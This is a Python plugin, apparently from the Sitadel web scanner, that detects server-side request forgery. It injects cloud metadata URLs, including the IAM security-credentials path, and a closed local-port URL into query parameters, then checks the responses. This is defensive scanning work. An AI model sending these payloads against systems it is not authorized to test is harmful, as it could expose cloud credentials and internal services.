"""Server-Side Request Forgery (SSRF) — issue #103 (in-band only).

Injects internal/metadata targets into URL-shaped query parameters and reads the
signal from the application's **own** HTTP response (in-band). Two detectors:

* **Cloud-metadata** (high confidence): point the parameter at the cloud metadata
  service; if the app fetches it and reflects the body, metadata markers appear.
* **Fetch-error differential** (indicator): point the parameter at a closed local
  port; a server-side connection error surfacing in the response — that is not
  present for a benign value — means the server fetched attacker-controlled input.

Blind / out-of-band SSRF is intentionally out of scope for v1 (no listener), and
this module never targets destructive endpoints. Shaped like ``open_redirect.py``
(param-hint targeting, bounded pool, cooperative cancel).
"""
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

from sitadel.config.settings import Risk
from sitadel.report import Severity
from sitadel.utils.container import Services
from .. import AttackPlugin

# Query parameters that plausibly cause a server-side fetch.
_SSRF_PARAMS = {
    "url", "uri", "link", "src", "source", "dest", "destination", "target",
    "redirect", "next", "data", "reference", "site", "html", "feed", "host",
    "port", "to", "out", "view", "path", "domain", "callback", "webhook",
    "proxy", "fetch", "load", "image", "img", "file", "document", "resource",
    "u", "r", "continue", "go", "open", "page",
}

# Metadata endpoints (AWS/GCP/Azure) to try reaching through the target.
_METADATA_PROBES = (
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://metadata.google.internal/computeMetadata/v1/",
)

# Markers that only appear in a cloud metadata response.
_METADATA_SIGNATURES = re.compile(
    r"ami-id|ami-launch-index|instance-id|instance-action|security-credentials"
    r"|local-ipv4|public-hostname|iam/info|computeMetadata|accessKeyId"
    r"|InstanceMetadata|compute/",
    re.I,
)

# Server-side connection errors that leak when the app fetched our input.
# Covers the phrasings of common HTTP clients (requests/urllib3, curl/PHP,
# aiohttp, Java, Go, Node) so the fetch-error differential is language-agnostic.
_FETCH_ERROR_SIGNATURES = re.compile(
    r"connection refused|failed to connect|could ?n.?t connect"
    r"|cannot connect to host|connect call failed|connection error"
    r"|failed to establish a new connection|unable to connect"
    r"|connection timed out|no route to host|actively refused|getaddrinfo"
    r"|name or service not known|connection reset|refused to connect"
    r"|econnrefused|econnreset|ehostunreach|dial tcp|max retries exceeded",
    re.I,
)

# A benign value (for the differential baseline) and a closed local port.
_BASELINE_URL = "http://example.com/"
_CLOSED_PORT_URL = "http://127.0.0.1:9/"


def _taint_params(url, value):
    """Set every SSRF-shaped query parameter to ``value`` (others unchanged).

    Returns ``None`` when the URL carries no SSRF-shaped parameter.
    """
    parts = urlsplit(url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    if not any(name.lower() in _SSRF_PARAMS for name, _ in pairs):
        return None
    tainted = [
        (name, value if name.lower() in _SSRF_PARAMS else existing)
        for name, existing in pairs
    ]
    return urlunsplit(
        (parts.scheme, parts.netloc, parts.path, urlencode(tainted), parts.fragment)
    )


def _ssrf_params(url):
    return [n for n, _ in parse_qsl(urlsplit(url).query)
            if n.lower() in _SSRF_PARAMS]


class Ssrf(AttackPlugin):
    level = Risk.DANGEROUS

    def _check(self, output, request, url):
        params = ",".join(_ssrf_params(url)) or None

        # 1) Cloud-metadata reachability (high confidence).
        for probe in _METADATA_PROBES:
            tainted = _taint_params(url, probe)
            if tainted is None:
                return
            resp = request.send(url=tainted, method="GET")
            if resp is not None and _METADATA_SIGNATURES.search(resp.text):
                output.finding(
                    "SSRF: cloud metadata service reachable through %s" % url,
                    url=url, plugin="Ssrf", parameter=params,
                    severity=Severity.CRITICAL,
                    evidence="injected %s -> metadata markers in response" % probe,
                    finding_type="ssrf",
                )
                return  # confirmed; nothing stronger to add

        # 2) Fetch-error differential (indicator): a connection error that
        # appears for a closed local port but not for a benign value means the
        # server fetched our input.
        base = request.send(url=_taint_params(url, _BASELINE_URL), method="GET")
        base_text = base.text if base is not None else ""
        probe = request.send(url=_taint_params(url, _CLOSED_PORT_URL), method="GET")
        if probe is None:
            return
        if (_FETCH_ERROR_SIGNATURES.search(probe.text)
                and not _FETCH_ERROR_SIGNATURES.search(base_text)):
            output.finding(
                "Potential SSRF: server-side fetch error leaked for a local "
                "target at %s" % url,
                url=url, plugin="Ssrf", parameter=params,
                confidence="tentative",
                evidence="injected %s -> connection-error signature in response"
                         % _CLOSED_PORT_URL,
                finding_type="ssrf",
            )

    def _cancelled(self):
        try:
            return Services.get("cancel").is_set()
        except NameError:
            return False

    def process(self, start_url, crawled_urls):
        output = Services.get("output")
        request = Services.get("request_factory")
        logger = Services.get("logger")

        output.info("Checking for SSRF...")
        targets = [
            url for url in (crawled_urls or [])
            if _taint_params(str(url), _BASELINE_URL) is not None
        ]
        if not targets:
            return

        def scan(url):
            if self._cancelled():
                return
            try:
                self._check(output, request, str(url))
            except Exception as e:
                logger.error(e)
                output.debug("SSRF error on %s: %s" % (url, e))

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = [executor.submit(scan, url) for url in targets]
            try:
                for future in as_completed(futures):
                    if self._cancelled():
                        executor.shutdown(cancel_futures=True)
                        break
                    future.result()
            except KeyboardInterrupt:
                executor.shutdown(False)
                raise
